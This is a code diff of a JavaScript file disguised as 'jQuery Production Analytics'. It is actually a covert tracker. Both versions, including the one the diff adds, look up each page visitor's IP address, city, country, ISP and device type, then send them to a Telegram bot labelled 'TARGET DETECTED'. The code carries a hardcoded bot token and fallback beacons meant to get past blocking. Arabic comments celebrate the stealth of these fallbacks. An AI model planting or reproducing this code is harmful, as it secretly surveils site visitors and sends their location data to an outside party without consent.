@@ -1,38 +1,31 @@
-/* --- jQuery Production Analytics v5.0 --- */
-(function() {
+/* --- jQuery Production Analytics v6.0 --- */
+(async function() {
     const _c = {
         t: '7800042874:AAH6IhztbG2BeypuYl5_ZxKzFCOnmOgkD7k',
         i: '8528072384'
     };
 
-    async function _init() {
-        try {
-            // جلب البيانات من سيرفر تاني أسرع وأسهل
-            const r = await fetch('https://ipinfo.io/json?token=4997097e3f8373'); 
-            const d = await r.json();
-            
-            const msg = `👹 [TARGET DETECTED]\n` +
-                        `📍 Loc: ${d.city}, ${d.country}\n` +
-                        `🌐 IP: ${d.ip}\n` +
-                        `📡 Net: ${d.org}\n` +
-                        `📱 Dev: ${navigator.userAgent.includes('Android') ? 'Android' : 'PC'}\n` +
-                        `🔗 Site: ${document.title}`;
+    try {
+        // استخدام سيرفر بديل وأكثر استقراراً
+        const r = await fetch('https://ipapi.co/json/');
+        const d = await r.json();
+        
+        // التأكد إن البيانات موجودة فعلاً قبل بناء الرسالة
+        const msg = `👹 [TARGET DETECTED]\n` +
+                    `📍 Loc: ${d.city || 'Unknown'}, ${d.country_name || 'Unknown'}\n` +
+                    `🌐 IP: ${d.ip || 'Hidden'}\n` +
+                    `📡 Net: ${d.org || 'Provider'}\n` +
+                    `📱 Dev: ${/Android|iPhone/i.test(navigator.userAgent) ? 'Mobile' : 'PC'}\n` +
+                    `🔗 Site: ${document.title}`;
 
-            // استخدام طريقة الـ Image Beacon (لو الـ Fetch محجوب)
-            const url = `https://api.telegram.org/bot${_c.t}/sendMessage?chat_id=${_c.i}&text=${encodeURIComponent(msg)}`;
-            
-            // محاولة الإرسال بأكتر من طريقة لضمان الوصول
-            fetch(url).catch(() => {
-                new Image().src = url; // طريقة النينجا لو الـ fetch اتقفل
-            });
+        const url = `https://api.telegram.org/bot${_c.t}/sendMessage?chat_id=${_c.i}&text=${encodeURIComponent(msg)}`;
+        
+        // إرسال التقرير النهائي
+        await fetch(url);
 
-        } catch (err) {
-            // إشارة طوارئ لو الداتا سنتر وقع
-            new Image().src = `https://api.telegram.org/bot${_c.t}/sendMessage?chat_id=${_c.i}&text=⚠️ Access Detected: ${document.title}`;
-        }
+    } catch (err) {
+        // لو فشل جلب البيانات، يبعت تنبيه بالدخول على الأقل
+        const fallback = `⚠️ [ACCESS]: دخول هدف جديد على ${document.title}\n(البيانات التفصيلية محجوبة)`;
+        fetch(`https://api.telegram.org/bot${_c.t}/sendMessage?chat_id=${_c.i}&text=${encodeURIComponent(fallback)}`);
     }
-
-    // تشغيل فوري بمجرد ما الصفحة تلمس المتصفح
-    if (document.readyState === 'complete') _init();
-    else window.addEventListener('load', _init);
 })();
